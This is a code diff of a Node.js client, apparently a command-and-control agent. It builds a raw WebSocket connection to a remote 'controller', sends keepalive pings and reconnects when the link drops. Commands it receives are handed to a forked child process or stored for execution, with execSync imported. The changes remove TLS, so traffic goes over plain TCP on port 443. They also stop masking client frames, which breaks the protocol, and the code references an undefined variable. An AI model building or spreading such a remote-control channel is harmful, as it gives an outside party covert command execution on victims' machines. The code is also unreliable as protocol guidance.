@@ -1,5 +1,5 @@
 const fs = require('fs')
-const tls = require('tls')
+const net = require('net')
 const { execSync, fork } = require('child_process')
 
 
@@ -16,7 +16,7 @@ startServer()
 
 setInterval(() => {
     sendPing(CONNECTION)
-}, 30000)
+}, 60000)
 
 setInterval(async () => {
     await checkStatus(false)
@@ -64,13 +64,13 @@ async function runWebSocket(url) {
     let port = 443
     let path = url.pathname + url.search
 
-    let socket = tls.connect({ host, port, servername: host }, () => {
+    let socket = net.connect({ host, port }, () => {
         socket.write(`GET ${path} HTTP/1.1\r\nHost: ${host}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: ${randomWebSocketKey()}\r\nSec-WebSocket-Version: 13\r\n\r\n`);
         sendWSMessage(socket, JSON.stringify({ t: 2, s: 'controller', d: { s:0, i:USER } }))
         sendWSMessage(socket, JSON.stringify({ t: 3, s: 'controller', d: { s:1, t: Date.now(), i:USER } }))
         sendWSMessage(socket, JSON.stringify({ t: 1, s: 'controller_cmd' }))
         CONNECTION = socket
-        console.log('Node: ---SOCKET-CONNECTION-OPEN---', new Date().toString())
+        console.log('Node: ---SOCKET-CONNECTION-OPEN---')
     })
 
     socket.on('data', (data) => {
@@ -81,36 +81,36 @@ async function runWebSocket(url) {
             if (opcode === 0x1) {
                 let secondByte = data[1]
                 let length = secondByte & 0x7f
-
                 let offset = 2
+
                 if (length === 126) {
                     length = data.readUInt16BE(offset)
                     offset += 2
                 } else if (length === 127) {
-                    length = data.readBigUInt64BE(offset)
+                    length = Number(data.readBigUInt64BE(offset))
                     offset += 8
                 }
 
-                let payload = data.slice(offset, offset + length)
+                let payload = data.slice(offset, offset + length);
                 let message = payload.toString('utf8')
 
                 try {
-                    let data = JSON.parse(message)
-                    
+                    let parsed = JSON.parse(message)
+
                     if (condition) {
                         if (mSendData) {
-                            if (mSendData != data.d) {
+                            if (mSendData != parsed.d) {
                                 if (mScript) {
-                                    mScript.send(data.d)
+                                    mScript.send(parsed.d)
                                 } else {
-                                    mCmd = data.d
+                                    mCmd = parsed.d
                                 }
                             }
                         } else {
                             if (mScript) {
-                                mScript.send(data.d)
+                                mScript.send(parsed.d)
                             } else {
-                                mCmd = data.d
+                                mCmd = parsed.d
                             }
                         }
                     }
@@ -118,11 +118,10 @@ async function runWebSocket(url) {
             }
         } catch (err) {}
     })
-
     
     socket.on('end', () => {
         CONNECTION = null
-        console.log('Node: ---SOCKET-CONNECTION-CLOSE---', new Date().toString())
+        console.log('Node: ---SOCKET-CONNECTION-CLOSE---')
         setTimeout(async () => {
             await runWebSocket(url)
         }, 3000)
@@ -143,44 +142,52 @@ async function runWebSocket(url) {
 
 function sendWSMessage(socket, message) {
     try {
-        if (!socket || socket.destroyed) {
-            return false
-        }
+        if (!socket || socket.destroyed) return false
 
-        let payload = Buffer.from(message, 'utf8')
-        let frame = Buffer.alloc(2 + 4 + payload.length)
-        frame[0] = 0x81
-        frame[1] = 0x80 | payload.length
+        const payload = Buffer.from(message, 'utf8')
+        let payloadLength = payload.length
 
-        let mask = []
-        for (let i = 0; i < 4; i++) mask.push(Math.floor(Math.random() * 256))
-        for (let i = 0; i < 4; i++) frame[2 + i] = mask[i]
+        let frame
 
-        for (let i = 0; i < payload.length; i++) {
-            frame[6 + i] = payload[i] ^ mask[i % 4]
+        if (payloadLength <= 125) {
+            frame = Buffer.alloc(2 + payloadLength)
+            frame[0] = 0x81
+            frame[1] = payloadLength
+            payload.copy(frame, 2)
+        } else if (payloadLength <= 65535) {
+            frame = Buffer.alloc(4 + payloadLength)
+            frame[0] = 0x81
+            frame[1] = 126
+            frame.writeUInt16BE(payloadLength, 2)
+            payload.copy(frame, 4)
+        } else {
+            frame = Buffer.alloc(10 + payloadLength)
+            frame[0] = 0x81
+            frame[1] = 127
+            frame.writeUInt32BE(0, 2)
+            frame.writeUInt32BE(payloadLength, 6)
+            payload.copy(frame, 10)
         }
 
         socket.write(frame)
-        
         return true
-    } catch (error) {
+    } catch (err) {
         return false
     }
 }
 
+
 function sendPing(socket) {
     try {
-        if (!socket || socket.destroyed) {
-            return false
-        }
+        if (!socket || socket.destroyed) return false
 
-        let payload = Buffer.from([0])
-        let frame = Buffer.alloc(2 + 4 + payload.length)
+        const payload = Buffer.from([0])
+        const frame = Buffer.alloc(2 + 4 + payload.length);
 
         frame[0] = 0x89
         frame[1] = 0x80 | payload.length
 
-        let mask = []
+        const mask = []
         for (let i = 0; i < 4; i++) mask.push(Math.floor(Math.random() * 256))
         for (let i = 0; i < 4; i++) frame[2 + i] = mask[i]
 
@@ -189,7 +196,6 @@ function sendPing(socket) {
         }
 
         socket.write(frame)
-        
         return true
     } catch (error) {
         return false
